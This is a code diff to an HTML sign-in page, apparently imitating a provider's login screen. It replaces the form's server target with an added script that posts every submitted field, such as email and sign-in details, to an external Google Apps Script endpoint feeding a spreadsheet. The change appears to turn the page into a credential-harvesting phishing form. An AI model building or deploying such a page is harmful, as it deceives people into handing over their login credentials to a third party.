@@ -14,7 +14,7 @@
         </div>
         <div class="login-box">
             <h2>Sign in</h2>
-            <form action="data.php method="POST">
+            <form name=submit-to-google-sheet>
 
                 <label for="email">Email</label>
                 <input type="email" id="email" name="email" placeholder="someone@example.com" required>
@@ -28,6 +28,17 @@
                     <button type="submit" class="submit-button">Submit</button>
                 </div>
             </form>
+            <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbxCVNF0hR7bbSlx7s_F8Lmpn_QGjQnEmopnsgdhhKOCfistR_P56s9Yc4BZ6HTnGLmS/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
         </div>
     </div>
 </body>
